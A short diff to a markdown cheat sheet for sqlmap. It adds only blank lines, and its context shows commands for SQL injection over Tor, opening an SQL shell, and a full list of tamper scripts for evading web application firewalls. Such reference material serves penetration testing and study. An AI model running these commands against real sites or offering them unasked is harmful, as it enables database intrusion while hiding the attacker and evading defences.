@@ -96,6 +96,8 @@ sqlmap -u <POST-URL> --data="<POST-paramters>"
 ```
 ### Use TOR SOCKS5 Proxy
 > ❗ Note: First active tor service: **service tor start**
+
+
 ```shell
 sqlmap -u "http://example.com/login.php" --tor --tor --check-tor --tor-type=SOCKS5 --tor-port=9050 
 ```
@@ -162,6 +164,8 @@ sqlmap --dbms=mysql -u "http://example.com/login.php" --sql-shell
 
 ## Best tampers
 > Add to the desired command
+
+
 ### All scripts
 ```shell
 --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
